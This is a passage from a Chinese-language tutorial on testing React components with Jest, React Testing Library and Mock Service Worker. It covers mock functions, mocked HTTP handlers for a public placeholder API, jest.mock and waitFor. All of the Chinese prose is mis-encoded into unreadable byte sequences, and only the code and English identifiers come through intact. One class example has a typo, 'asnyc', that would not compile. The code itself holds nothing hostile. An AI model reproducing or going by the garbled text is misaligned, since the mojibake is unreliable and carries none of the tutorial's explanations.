onIncrement={incrementHandler} onIncrement={decrementHandler} /&gt;) // æŒ‰éˆ•å…ƒç´  const incrementBtn = screen.getByRole('button', { name: /increment/i }) const decrementBtn = screen.getByRole('button', { name: /decrement/i }) // user é»æ“Š await userEvent.click(incrementBtn) await userEvent.click(decrementBtn) // é æœŸå…©å€‹ handler å„è¢«å‘¼å«ä¸€æ¬¡ expect(incrementHandler).toBeCalledTimes(1) expect(decrementHandler).toBeCalledTimes(1)}) ä½†æœƒçœ‹åˆ°é€™æ®µéŒ¯èª¤ï¼š ç°¡å–®ä¾†èªª jest æœƒè¦å®šä½ ç”¨å®ƒæä¾› mock function ä¾†è™•ç†é€™æ®µæ¸¬è©¦ï¼Œæ‰€ä»¥æœƒæ”¹å¯«æˆé€™æ¨£ï¼š 12345678910111213141516test('handlers are invoked correctly', async () =&gt; { // æ”¹æˆ mock function const incrementHandler = jest.fn() const decrementHandler = jest.fn() render(&lt;Counter2 count={10} onIncrement={incrementHandler} onDecrement={decrementHandler} /&gt;) const incrementBtn = screen.getByRole('button', { name: /increment/i }) const decrementBtn = screen.getByRole('button', { name: /decrement/i }) await userEvent.click(incrementBtn) await userEvent.click(decrementBtn) expect(incrementHandler).toBeCalledTimes(1) expect(decrementHandler).toBeCalledTimes(1)}) æ‰€ä»¥ç¢°åˆ°é¡ä¼¼é€™ç¨®æƒ…æ³æ™‚å¯ä»¥ç”¨ mock function ä¾†è§£æ±ºã€‚ RTLï¼æ­é… MSW æ¸¬è©¦ HTTP Requeståœ¨å¯«ä»»ä½•æ‡‰ç”¨æ™‚ä¸€å®šæœƒç¢°åˆ° HTTP Request çš„éœ€æ±‚ï¼Œé€™æ™‚å€™çš„æ¸¬è©¦å¾—æ–¹å¼ä¹Ÿæœƒè·Ÿä»¥å¾€ä¸å¤ªä¸€æ¨£ï¼Œæœƒç›¸å°è¤‡é›œä¸€äº›ã€‚ å…ˆä¾†çœ‹é€™æ¬¡çš„ç¯„ä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738import { useEffect, useState } from 'react'export const User = () =&gt; { // å¯«æˆ custom hook æŠ½å‡ºå» const { users, error } = useUsers() return ( &lt;div&gt; &lt;h1&gt;User&lt;/h1&gt; {error &amp;&amp; &lt;p&gt;{error}&lt;/p&gt;} &lt;ul&gt; {users.map((user) =&gt; ( &lt;li key={user}&gt;{user}&lt;/li&gt; ))} &lt;/ul&gt; &lt;/div&gt; )}// fetch users çš„é‚è¼¯function useUsers() { const [users, setUsers] = useState&lt;string[]&gt;([]) const [error, setErorr] = useState&lt;null | string&gt;(null) useEffect(() =&gt; { fetch('https://jsonplaceholder.typicode.com/users') .then(async (response) =&gt; { if (!response.ok) { return Promise.reject(await response.json()) } return response.json() }) .then((users: any[]) =&gt; setUsers(users.map((user) =&gt; user.name))) .catch((err: any) =&gt; setErorr(err.errorMessage)) }, []) return { users, error }} é€™å€‹ç¯„ä¾‹æ˜¯ä¸²æ¥ jsonplaceholder çš„ APIï¼Œé‚è¼¯ä¸Šæ‡‰è©²ä¸æœƒå¤ªè¤‡é›œï¼Œåªæ˜¯æŠŠæŠ“åˆ°çš„ user é¡¯ç¤ºåœ¨ç•«é¢ä¸Šï¼Œå¤±æ•—çš„è©±å°±é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ã€‚ é‚£æ¥ä¸‹ä¾†è©²å¦‚ä½•å°é€™æ®µ HTTP Request åšæ¸¬è©¦å‘¢ï¼Ÿåœ¨é–‹å§‹ä¹‹å‰è¦å…ˆé‡æ¸…ä¸€å€‹è§€å¿µï¼š åœ¨åŒ…å« API çš„å–®å…ƒæ¸¬è©¦ä¸­ï¼Œæˆ‘å€‘åªèƒ½ç”¨ mock çš„æ–¹å¼å»æ¨¡æ“¬ API çš„é‹è¡Œã€‚æƒ³è¦å®Œæ•´çš„æ¸¬è©¦ API + App æœ¬èº«ï¼Œé‚£è©²åšçš„æ˜¯ E2E æ¸¬è©¦è€Œä¸æ˜¯å–®å…ƒæ¸¬è©¦ã€‚ ç•¢ç«Ÿ API ç›¸é—œçš„äº‹æƒ…æœƒç‰½æ¶‰åˆ° serverï¼Œå°å–®å…ƒæ¸¬è©¦ä¾†èªªé€™å€‹ scope å¤ªå»£äº†ï¼Œæ‰€ä»¥æ…£ä¾‹ä¸Šæœƒè‡ªå·± mock ä¸€å€‹ api server å‡ºä¾†åšæ¸¬è©¦ï¼Œä¹Ÿå°±æ˜¯ç­‰ä¸€ä¸‹è¦ä»‹ç´¹çš„å¥—ä»¶ï¼šMock Service Worker (MSW) å®‰è£èˆ‡é…ç½® MSWmsw æ˜¯ä¸€å€‹ç”¨ä¾†æ¨¡æ“¬ API çš„å¥—ä»¶ï¼Œåªè¦ç”¨è·Ÿ express é¡ä¼¼çš„èªæ³•å°±èƒ½å¿«é€Ÿå»ºèµ·ä¸€å€‹ API serverï¼Œä¸¦ä¸”åœ¨çœŸæ­£çš„ request é€å‡ºä»¥å‰é€éã€Œæ””æˆªã€çš„æ–¹å¼ä¾†å–ä»£åŸæœ¬çš„ requestã€‚ 1. å®‰è£ MSW 123npm install msw --save-dev# oryarn add msw --dev 2. å»ºç«‹é…ç½®æª”æ¡ˆ 12345678910â”œâ”€â”€ srcâ”‚&nbsp;&nbsp; â”œâ”€â”€ componentsâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ Userâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ User.test.tsxâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ User.tsxâ”‚&nbsp;&nbsp; â”œâ”€â”€ mocks &lt;- é€™å€‹â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ handlers.ts &lt;- é€™å€‹â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ server.ts &lt;- é€™å€‹â”œâ”€â”€ tsconfig.jsonâ””â”€â”€ yarn.lock handlers.ts æ˜¯ç”¨ä¾†è¨­å®š mock çš„ API è™•ç†ï¼Œå…§å®¹æœƒæ˜¯é€™æ¨£ï¼š 1234567891011// msw æä¾› Restful å’Œ GraphQL å…©ç¨®é¸æ“‡import { rest } from 'msw'// handlers å¯ä»¥æœ‰å¤šå€‹æ‰€ä»¥æ˜¯é™£åˆ—çµæ§‹ï¼Œæ¯ä¸€å€‹ item ä»£è¡¨ä¸€å€‹ handlerexport const handlers = [ // è¦æ””æˆªçš„ requestï¼ˆå°æ‡‰åˆ° User.tsx ä¸­çš„ fetchï¼‰ rest.get('https://jsonplaceholder.typicode.com/users', (req, res, ctx) =&gt; { // è¨­å®š response return res(ctx.status(200), ctx.json([{ name: 'PeaNu' }, { name: 'PPB' }, { name: 'Ariana' }])) })] ç¨å¾®è§£é‡‹ä¸€ä¸‹é€™è£¡çš„åŸç†ï¼Œè¨­å®šé€™éš»æª”æ¡ˆçš„ç”¨æ„æ˜¯ç•¶æˆ‘å€‘åœ¨ User.tsx å»å° jsonplaceholder ç™¼å‡º GET è«‹æ±‚æ™‚ï¼Œmsw æœƒå…ˆæª¢æŸ¥ handlers ä¸­æ˜¯å¦æœ‰å°æ‡‰çš„ APIï¼Œè‹¥æœ‰çš„è©±å°±æœƒæ””æˆªä¸‹ä¾†ä¸Ÿçµ¦ handlers è™•ç†ã€‚ä¹Ÿå°±æ˜¯èªª API å¯¦éš›ä¸Šä¸æœƒç™¼é€åˆ° jsonplaceholder é‚£é‚Šï¼Œè€Œæ˜¯ msw çš„ handlerã€‚ server.ts æ˜¯ç”¨ä¾†è¨­ç½® server çš„åœ°æ–¹ï¼š 12345import { setupServer } from 'msw/node'// å¼•å…¥å‰é¢çš„ handlersimport { handlers } from './handlers'// server æœ¬é«”export const server = setupServer(...handlers) 3. è¨­ç½® setupTest.ts hooks é™¤äº†è¨­å®š server ä»¥å¤–ï¼Œæˆ‘å€‘ä¹Ÿå¾—å° jest æœ¬èº«åšä¸€äº›èª¿æ•´ï¼Œå¦å‰‡å®ƒä¸æœƒçŸ¥é“æˆ‘å€‘æœ‰ mock ä¸€å€‹ server çµ¦å…ƒä»¶ä½¿ç”¨ï¼š 123456789101112131415// jest-dom adds custom jest matchers for asserting on DOM nodes.// allows you to do things like:// expect(element).toHaveTextContent(/react/i)// learn more: https://github.com/testing-library/jest-domimport '@testing-library/jest-dom'// éœ€è¦æ·»åŠ çš„è¨­å®šæ˜¯ä¸‹é¢é€™äº›import { server } from './mocks/server'// Establish API mocking before all tests.beforeAll(() =&gt; server.listen())// Reset any request handlers that we may add during the tests,// so they don't affect other tests.afterEach(() =&gt; server.resetHandlers())// Clean up after the tests are finished.afterAll(() =&gt; server.close()) å…¶å¯¦å°±æ˜¯åœ¨ä¸åŒæ™‚é–“é»åšä¸€äº›è¨­å®šè€Œå·²ï¼š beforeALlï¼šåœ¨æ¸¬è©¦åŸ·è¡Œä¹‹å‰ï¼Œæ¶å¥½ server çš„ lstener afterEachï¼šå–®ä¸€å€‹ test è·‘å®Œæ™‚ï¼Œé‡è¨­ handler é¿å…äº’ç›¸å¹²æ“¾ afterAllï¼šæ‰€æœ‰æ¸¬è©¦è·‘å®Œå¾Œï¼Œé—œé–‰ server é€™é‚Šåªæ˜¯åšä¸€å€‹å…¨åŸŸè¨­å®šä¾†çœæ‰ä¸€äº›éº»ç…©è€Œå·²ã€‚ æ’°å¯«æ¸¬è©¦msw è¨­å®šå¥½ä¹‹å¾Œå°±å¯ä»¥é–‹å§‹ä¾†å¯«æ¸¬è©¦äº†ï¼Œç›´æ¥ä¾†çœ‹ codeï¼š 12345678910111213141516171819202122describe('Users', () =&gt; { // happy part test('renders list of items', async () =&gt; { render(&lt;User /&gt;) const listItem = await screen.findAllByRole('listitem') // mock server å›å‚³çš„è³‡æ–™æœ‰ 3 ç­†ï¼Œæ‰€ä»¥é æœŸè¦æœ‰ 3 å€‹ &lt;li&gt; expect(listItem).toHaveLength(3) }) // sad partï¼ˆéŒ¯èª¤è™•è£¡ï¼‰ test('renders error message', async () =&gt; { const errorMessage = 'System Internal Error.' server.use( rest.get('https://jsonplaceholder.typicode.com/users', (req, res, ctx) =&gt; { return res(ctx.status(500), ctx.json({ errorMessage })) }) ) render(&lt;User /&gt;) const error = await screen.findByText(errorMessage) expect(error).toBeInTheDocument() })}) é€™é‚ŠåŒæ™‚æ¸¬è©¦äº†æˆåŠŸå’Œå¤±æ•—çš„çµæœã€‚ é¦–å…ˆæˆåŠŸçš„éƒ¨åˆ†å°±è·Ÿå¹³å¸¸çš„æ¸¬è©¦å·®ä¸å¤šï¼Œå› ç‚ºå‰é¢æœ‰åšå¥½è¨­å®šäº†æ‰€ä»¥ jest æœƒè‡ªå‹•å»è®“ mock server æ””æˆª &lt;User /&gt; ä¸­çš„ requestã€‚ è‡³æ–¼å¤±æ•—çš„éƒ¨åˆ†ä¹Ÿè¦åšä¸€äº›èª¿æ•´ï¼Œå› ç‚ºæˆ‘å€‘æ²’è¾¦æ³•è®“å–®ä¸€å€‹ handler åŒæ™‚è™•ç†æˆåŠŸå’Œå¤±æ•—ï¼Œæ‰€ä»¥é€™é‚Šçš„åšæ³•æ˜¯ç›´æ¥åœ¨æ¸¬è©¦ä¸­å¯«å¦ä¸€å€‹ handler ä¾†æ‹‹å‡º 500 erorrï¼Œé€™æ¨£å­å°±å¯ä»¥ä¸€æ¬¡åšå…©ç¨®æ¸¬è©¦äº†ã€‚ RTLï¼å¦ä¸€ç¨®æ¸¬è©¦ HTTP Request çš„æ–¹å¼å‰é¢æœ‰ä»‹ç´¹æ€éº¼ç”¨ msw å¥—ä»¶ä¾†æ¸¬è©¦ HTTP Requestï¼Œä½†å¦‚æœä½ æ²’æœ‰æƒ³è¦é‚£éº¼ç›´æ¥æ¨¡æ“¬ server çš„ç‰¹æ€§ï¼ˆåƒæ˜¯æœƒå›å‚³ HTTP status codeã€ç­‰å¾…å›å‚³çš„æ™‚é–“ç­‰ç­‰ï¼‰ã€‚é‚£å…¶å¯¦ä¸ä¸€å®šè¦åˆ©ç”¨ msw ä¾†å»ºä¸€å€‹æ¨¡æ“¬ server åšæ¸¬è©¦ï¼Œåªè¦ç”¨ jest æä¾›çš„ mock function å°±è¡Œäº†ã€‚ ä¾†çœ‹ä¸€å€‹å¯¦éš›çš„ä¾‹å­ã€‚ getUser.tsï¼š 1234567// æ‰“ API æ‹¿è³‡æ–™çš„ functionexport async function getUser() { return await fetch('https://jsonplaceholder.typicode.com/users/') .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error)} Users.tsxï¼š 1234567891011121314151617181920212223242526272829import { useEffect, useState } from 'react'import { getUser } from './getUser'function Users() { const [users, setUsers] = useState&lt;any[]&gt;([]) const [errorMessage, setErrorMessage] = useState&lt;null | string&gt;(null) useEffect(() =&gt; { // åˆ©ç”¨ getUser å–å¾— user list getUser() .then((users) =&gt; setUsers(users)) .catch((error) =&gt; setErrorMessage(error.message)) }, []) // æˆåŠŸçš„è©±æ¸²æŸ“ user åˆ—è¡¨ï¼Œå¤±æ•—çš„è©±é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ return ( &lt;div className='App'&gt; &lt;h2&gt;Users:&lt;/h2&gt; &lt;ul&gt; {users.map((user: any) =&gt; ( &lt;li key={user.name}&gt;{user.name}&lt;/li&gt; ))} &lt;/ul&gt; {errorMessage &amp;&amp; &lt;p&gt;{errorMessage}&lt;/p&gt;} &lt;/div&gt; )}export default Users Users.test.tsxï¼š 123456789101112131415161718192021222324252627282930import { render, screen } from '@testing-library/react'import { getUser } from './getUser'import Users from './Users'// å‘Šè¨´ jest æˆ‘å€‘è¦ mock çš„æ¨¡çµ„ä½ç½®ï¼Œä»–æœƒè‡ªå‹•æ‹¿ä¾†åš mock//ï¼ˆæˆ‘ç•¶åˆä¹Ÿæœ‰é»ç–‘æƒ‘é€™æ€éº¼åšåˆ°çš„ï¼Œä½†ä¸è¦æ‡·ç–‘å°±æ˜¯é€™æ¨£åšï¼‰jest.mock('./getUser')// ç‚ºæˆ‘å€‘è¦ mock çš„ function å®šç¾© typeï¼ˆé€™æ¨£æ‰æœ‰æ­£ç¢ºçš„ type checkï¼‰const mockGetUser = getUser as jest.MockedFunction&lt;typeof getUser&gt;test('call api correctly', async () =&gt; { const response = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }] mockGetUser.mockResolvedValueOnce(response) render(&lt;Users /&gt;) expect(mockGetUser).toHaveBeenCalledTimes(1) const listItem = await screen.findAllByRole('listitem') expect(listItem).toHaveLength(2) screen.debug()})test('call api failed', async () =&gt; { const message = 'System Internal Error' mockGetUser.mockRejectedValueOnce(new Error(message)) render(&lt;Users /&gt;) expect(mockGetUser).toHaveBeenCalledTimes(1) const errorText = await screen.findByText(message) expect(errorText).toBeInTheDocument() screen.debug()}) æ¸¬è©¦çµæœä¸€ï¼ˆfetch æˆåŠŸï¼‰ï¼š æ¸¬è©¦çµæœäºŒï¼ˆfetch å¤±æ•—ï¼‰ï¼š é‚„è »ç°¡æ½”çš„å°å§ï¼Ÿä¸éç¼ºé»å°±æ˜¯æ²’é‚£éº¼æ¥è¿‘å¯¦éš›çš„ server è€Œå·²ï¼Œå› ç‚ºä¸æœƒæœ‰å¯¦éš›å»æ‰“ API çš„è¡Œç‚ºç™¼ç”Ÿã€‚ jest.mock çš„ç”¨æ³•å¦‚æœå‰›å‰›çš„ç¯„ä¾‹ä½ çœ‹å¾—æ‡‚çš„è©±å¯ä»¥ç„¡è¦–é€™ä¸€æ®µï¼Œé€™æ®µæ˜¯æƒ³æ›´æ·±å…¥è§£é‡‹ä¸€ä¸‹ mock çš„ç”¨æ³•ï¼Œå› ç‚ºæˆ‘è‡ªå·±ç•¶åˆåœ¨é€™é‚Šé‚„å¡è »ä¹…çš„ QQ é€™é‚Šæœƒä»‹ç´¹çš„æ–¹æ³•æœ‰åº•ä¸‹å¹¾å€‹ï¼š jest.mock mockResolvedValue mockRejectedValue ä¾†çœ‹é€™æ¬¡çš„ç¯„ä¾‹ï¼š 1234567891011export function getCount(): Promise&lt;string | number&gt; { return new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { const count = Math.random() * 10 if (count &gt; 5) { return reject('Faild') } return resolve(count) }, 500) })} åªæ˜¯å€‹ 0.5 ç§’å¾Œæœƒå›å‚³æ•¸å­—ï¼Œä½†æœ‰æ©Ÿç‡å¤±æ•—çš„ä¾‹å­ã€‚ å‡è¨­èªªæˆ‘å€‘ç¾åœ¨æƒ³è¦ mock é€™å€‹ function çš„è©±ï¼Œå¯ä»¥é€™æ¨£å­å¯«ï¼š 123456789101112131415161718192021222324252627282930import { getCount } from './getCount'// å‘Šè¨´ jest æˆ‘å€‘æƒ³è¦ mock çš„ &lt;Source&gt;ï¼ˆå¼•å…¥è·¯å¾‘ï¼‰jest.mock('./getCount')// å®šç¾© mock function çš„ typeï¼ˆTypeScript æ‰éœ€è¦ï¼‰const mockGetCount = getCount as jest.MockedFunction&lt;typeof getCount&gt;test('should receive correctly value', async () =&gt; { const response = 50 // å®šç¾© promise è¢« resolve å¾Œå›å‚³çš„å€¼ï¼ˆ50ï¼‰ mockGetCount.mockResolvedValue(response) // åŸ·è¡Œ mock function const count = await mockGetCount() // é æœŸ count = 50 expect(count).toBe(response)})test('should receive error', async () =&gt; { const response = 'Ooops' // å®šç¾© promise è¢« reject å¾Œå›å‚³çš„å€¼ï¼ˆ'Oops'ï¼‰ mockGetCount.mockRejectedValue(new Error(response)) // ç”¨è®Šæ•¸ä¾†å„²å­˜å›å‚³çµæœ let errorMessage: string await mockGetCount() // reject æœƒé€²å…¥ catch å€å¡Šï¼Œæ¥è‘—æŠŠå€¼å­˜å…¥å‰›å‰›çš„è®Šæ•¸ .catch((error) =&gt; (errorMessage = error.message)) // æœ€å¾ŒåŸ·è¡Œ assertionï¼ˆæ–·è¨€ï¼‰ .finally(() =&gt; expect(errorMessage).toBe(response))}) é›–ç„¶ç”¨äº†å¾ˆæ‡¶äººçš„è¨»è§£æ³•ä¾†è§£é‡‹ï¼Œä¸éæˆ‘è¦ºå¾—ä»¥é€™å€‹ç¯„ä¾‹ä¾†èªªæ‡‰è©²ä¸é›£ç†è§£ã€‚å¦‚æœé‚„æ˜¯æœ‰ç–‘å•çš„è©±å»ºè­°åˆ°ä¸Šé¢çš„å®˜æ–¹æ–‡ä»¶é€£çµé»é€²å»çœ‹ä¸€ä¸‹æ¯ä¸€å€‹ method å¤§æ¦‚åœ¨å¹¹å˜›æ‡‰è©²æœƒæ›´æ¸…æ¥šä¸€é»ã€‚ å•é¡Œé›†ç•¶ä½ çš„ api function æ¯”è¼ƒè¤‡é›œæ™‚çš„ mock æ–¹å¼ç”±æ–¼æˆ‘è‡ªå·±å·¥ä½œä¸Šçš„å°ˆæ¡ˆè¦æ‰“çš„ API æ•¸é‡éå¸¸ä¹‹å¤šï¼Œæ‰€ä»¥ call api çš„ method ä¸æœƒæ˜¯é‚£ç¨®åƒ getUser çš„å–®ä¸€å€‹é …ç›®ä¾†è™•ç†ï¼Œè€Œæ˜¯æœƒåŒ…è£ Object æˆ– OOP çš„å½¢å¼ï¼Œåƒé€™æ¨£å­ï¼š 1234567891011121314151617export function User() { async function getAll() { return await fetch('https://jsonplaceholder.typicode.com/users/') .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error) } async function getSingle(id: number) { return await fetch('https://jsonplaceholder.typicode.com/users/' + id) .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error) } // ä»¥æ­¤é¡æ¨... return { getAll, getSingle }} æˆ–æ˜¯é€™æ¨£å­ï¼ˆclass å¯«æ³•ï¼‰ï¼š 123456789101112131415export class User { static asnyc getAll() { return await fetch('https://jsonplaceholder.typicode.com/users/') .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error) }static async getSingle(id: number) { return await fetch('https://jsonplaceholder.typicode.com/users/' + id) .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error) } // ä»¥æ­¤é¡æ¨...} é€™å…©ç¨® mock çš„å¯«æ³•ç­‰ä¸€ä¸‹éƒ½æœƒä»‹ç´¹ï¼Œé€™è£¡ä¾†çœ‹ç¬¬ä¸€ç¨®çš„è§£æ³•ã€‚ é¦–å…ˆå¦‚æœæ˜¯ç¬¬ä¸€å€‹ apiï¼Œé‚£åœ¨ component ä¸­ä½¿ç”¨çš„æ–¹å¼æ‡‰è©²æœƒæ˜¯é€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829function Users() { // åŸ·è¡Œ User å–å‡ºæ‰€æœ‰ api çš„ methods const user = User() const [users, setUsers] = useState&lt;any[]&gt;([]) const [errorMessage, setErrorMessage] = useState&lt;null | string&gt;(null) useEffect(() =&gt; { user .getAll() .then((users) =&gt; setUsers(users)) .catch((error) =&gt; setErrorMessage(error.message)) }, []) return ( &lt;div className='App'&gt; &lt;h2&gt;Users:&lt;/h2&gt; &lt;ul&gt; {users.map((user: any) =&gt; ( &lt;li className='hello' key={user.name}&gt; {user.name} &lt;/li&gt; ))} &lt;/ul&gt; {errorMessage &amp;&amp; &lt;p&gt;{errorMessage}&lt;/p&gt;} &lt;/div&gt; )}export default Users é€™æ™‚å€™æœƒç¢°åˆ°çš„å•é¡Œæ˜¯ï¼šã€Œè©²æ€éº¼å° getAll åš mockï¼Ÿã€ æˆ‘ä¸€é–‹å§‹çš„åšæ³•æ˜¯é€™æ¨£ï¼š 12345678910111213141516171819import { render, screen } from '@testing-library/react'import { User } from './getUser'import Users from './Users'jest.mock('./getUser')const mockUser = User as jest.MockedFunction&lt;typeof User&gt;test('call api correctly', async () =&gt; { const response = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }, { name: 'Test Other' }] // ä¿®æ”¹ getAll çš„å›å‚³å€¼ mockUser().getAll.mockReturnValue(response) // render the Users component render(&lt;Users /&gt;) expect(mockUser).toHaveBeenCalledTimes(1) const listItem = await screen.findAllByRole('listitem') expect(listItem).toHaveLength(3)}) ä½† mockUser().getAll.mockReturnValue(response) é€™æ®µæ˜¯æœ‰å•é¡Œçš„ï¼š å¾Œä¾†æˆ‘ä¹Ÿè©¦éå„å¼å„æ¨£çš„æ–¹æ³•ï¼Œä½†é‚„æ˜¯éƒ½ä¸è¡Œã€‚ç›´åˆ°å¾Œä¾†çˆ¬æ–‡çˆ¬å‡ºäº†ä¸€äº›å¿ƒå¾—ä»¥å¾Œï¼Œæ‰ç™¼ç¾æ•´é«”æ€è·¯æ‡‰è©²è¦è½‰æ›ä¸€ä¸‹æ‰å°ã€‚ é¦–å…ˆï¼Œå‰›å‰›çš„æƒ³æ³•æ˜¯èšç„¦åœ¨æ€éº¼ä¿®æ”¹ component ä¸­çš„ getAllï¼Œä½†é€™æ¨£æƒ³æ˜¯ä¸å°çš„ï¼Œå› ç‚ºå° component ä¾†èªªå®ƒå¯¦éš›ç”¨çš„æ˜¯ã€ŒæŠŠ User çš„å›å‚³å€¼è£¡é¢çš„ getAll æ‹¿ä¾†ç”¨ã€ã€‚ä¹Ÿå°±æ˜¯èªªä½ æ‡‰è©²è¦ä¿®æ”¹çš„æ˜¯æ•´å€‹ User çš„å›å‚³å€¼ï¼Œè€Œä¸æ˜¯å–®ç´”åªæ”¹ getAll çš„å›å‚³å€¼ã€‚ è½èµ·ä¾†å¯èƒ½æœ‰é»æŠ½è±¡ï¼Œæ‰€ä»¥ç”¨ code ä¾†è§£é‡‹å§ï¼š 123456789101112131415161718192021import { render, screen } from '@testing-library/react'import { User } from './getUser'import Users from './Users'jest.mock('./getUser')const mockUser = User as jest.MockedFunction&lt;typeof User&gt;test('call api correctly', async () =&gt; { const response = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }, { name: 'Test Other' }] // å»ºç«‹ getAll çš„ mock function const getAll = jest.fn().mockResolvedValue(response) // è¨­å®š mockUser çš„å›å‚³å€¼ï¼ˆä¸Šé¢çš„ getAll mock functionï¼‰ mockUser.mockReturnValue({ getAll }) // render the Users component render(&lt;Users /&gt;) expect(mockUser).toHaveBeenCalledTimes(1) const listItem = await screen.findAllByRole('listitem') expect(listItem).toHaveLength(3)}) ç°¡å–®ä¾†èªªï¼Œé™¤äº†ç‚ºåŸæœ¬çš„ User å»ºç«‹ mock ä»¥å¤–ï¼Œä½ ä¹Ÿå¾—å°ä»–çš„å›å‚³å€¼çš„ function åš mockã€‚ç®—æ˜¯ä¸€å€‹æ¯”è¼ƒ tricky çš„åšæ³•ï¼Œä½†ä»¥é€™å€‹æ¡ˆä¾‹ä¾†èªªæˆ‘ç›®å‰åªçŸ¥é“é€™ç¨®è§£æ³•è€Œå·² QQ æ¥ä¸‹ä¾†æ˜¯ç¬¬äºŒç¨® class çš„ä½œæ³•ï¼Œæ¦‚å¿µä¸Šè·Ÿå‰›å‰›å¾ˆé¡ä¼¼ï¼Œæ‰€ä»¥é€™è£¡å°±ç›´æ¥é™„ code äº†ï¼š 1234567891011121314151617181920import { render, screen } from '@testing-library/react'import { User } from './getUser'import Users from './Users'jest.mock('./getUser')const mockUser = User as jest.MockedClass&lt;typeof User&gt;test('call api correctly', async () =&gt; { const response = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }, { name: 'Test Other' }] // getAll çš„ mock const mockGetAll = jest.fn().mockResolvedValue(response) // æŠŠ getAll ä¿®æ”¹ç‚º mock function mockUser.getAll = mockGetAll render(&lt;Users /&gt;) expect(mockUser.getAll).toHaveBeenCalledTimes(1) const listItem = await screen.findAllByRole('listitem') expect(listItem).toHaveLength(3)}) æ˜æ˜ mock æœ‰è¢«åŸ·è¡Œï¼Œç‚ºä»€éº¼ toHaveBeenCalledTimes åµæ¸¬ä¸åˆ°ï¼Ÿç•¶æ™‚çš„æƒ…å¢ƒå¦‚ä¸‹ï¼š 1234567891011121314useEffect(() =&gt; { getData() .then() .catch((error) =&gt; { setErrorMessage(error.message) })}, [])async function getData() { const all = await user.getAll() const single = await user.getSingle() setUsers(all) setSingle(single)} é€™é‚Šåœ¨ useEffect ä¸­å»åŸ·è¡Œ user.getAll() å’Œ user.getSingle()ï¼Œæ‰€ä»¥å¯«äº†æ®µæ¸¬è©¦æƒ³æª¢æŸ¥æ˜¯å¦æœ‰æ­£ç¢ºçš„å‘¼å«é€™å…©å€‹ functionï¼š 12345678910111213141516171819202122232425import { render } from '@testing-library/react'import { User } from './getUser'import Users from './Users'jest.mock('./getUser')const mockUser = User as jest.MockedFunction&lt;typeof User&gt;test('call api correctly', async () =&gt; { // mock part const response1 = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }, { name: 'Test Other' }] const response2 = { name: 'Leanne Graham' } const mockGetAll = jest.fn().mockResolvedValue(response1) const mockGetSingle = jest.fn().mockResolvedValue(response2) mockUser.mockReturnValue({ getAll: mockGetAll, getSingle: mockGetSingle }) render(&lt;Users /&gt;) // assertion expect(mockGetAll).toHaveBeenCalledTimes(1) // æ‡‰è©²è¢«å‘¼å« 1 æ¬¡ expect(mockGetSingle).toHaveBeenCalledTimes(1) // æ‡‰è©²è¢«å‘¼å« 1 æ¬¡}) çµæœå¦‚ä¸‹ï¼š åŸå› æ˜¯ await çš„ç‰¹æ€§æœƒè®“ mockGetSingle ç­‰åˆ° mockGetAll åŸ·è¡Œå®Œä»¥å¾Œæ‰æœƒåŸ·è¡Œï¼Œä½†æ¸¬è©¦æ™‚å»æ²’æœ‰åšä»»ä½•çš„ç­‰å¾…ï¼Œæ‰€ä»¥æ¸¬è©¦çš„ç•¶ä¸‹ mockGetSingle ç¢ºå¯¦é‚„æ²’æœ‰è¢«åŸ·è¡Œï¼Œå› æ­¤æ‰æœƒå¾—åˆ° 0ã€‚ è§£æ±ºçš„æ–¹æ³•æ˜¯æŠŠ assertion åŠ ä¸Š waitForï¼š 12await waitFor(() =&gt; expect(mockGetAll).toHaveBeenCalledTimes(1))await waitFor(() =&gt; expect(mockGetSingle).toHaveBeenCalledTimes(1)) é›–ç„¶ä»¥é€™å€‹ä¾‹å­ä¾†èªªåªéœ€è¦å¹« mockGetSingle åŠ ä¸Šå°±å¥½ï¼Œä½†æˆ‘è‡ªå·±ç¿’æ…£æ˜¯ä¸€å¾‹åŠ ä¸Šï¼Œé€™æ¨£æœƒæ›´ä¿éšªä¸€é»ã€‚ Jest çš„é¡¯ç¤ºçµæœæ²’æœ‰åŒ…å«æ•˜è¿°ï¼Ÿ åŠ ä¸Š --verbose é€™å€‹ flag å°±å¯ä»¥è§£æ±ºäº†ï¼š 12npm run test --verboseyarn run test --verbose æœ‰äº›æƒ…æ³ä¸‹æˆ‘åªç”¨ querySelector ç­‰ç­‰ç›¸é—œçš„ query ä¾†æŸ¥è©¢å…ƒç´ ï¼Œä½†é‚£å€‹å…ƒç´ åˆæœƒæ ¹æ“š state æ›´æ–°æ™‚è©²æ€éº¼è™•ç†ï¼Ÿé€™ç¨®æƒ…æ³æ‡‰è©²çœŸçš„å¾ˆå°‘å¾ˆå°‘ï¼Œå› ç‚ºå†æ€éº¼æ¨£ä½ æœ€å¾Œæ‡‰è©²éƒ½èƒ½é€é data-testId çš„æ–¹å¼ä¾†è™•ç†ï¼Œä½†æˆ‘å¾ˆå·§çš„å°±å‰›å¥½ç¢°åˆ°é€£ data-testId éƒ½æ²’è¾¦æ³•åŠ çš„çª˜å¢ƒï¼ˆæ±—ï¼Œæ‰€ä»¥ç‰¹åˆ¥èªªæ˜ä¸€ä¸‹é€™ç¨®æ™‚å€™è©²æ€éº¼è™•è£¡ã€‚ ä¾†èˆ‰ä¸€å€‹ç¯„ä¾‹ï¼š 1234567891011121314151617181920212223import { useEffect, useState } from 'react'export const QueryByClass = () =&gt; { const [isLogin, setIsLogin] 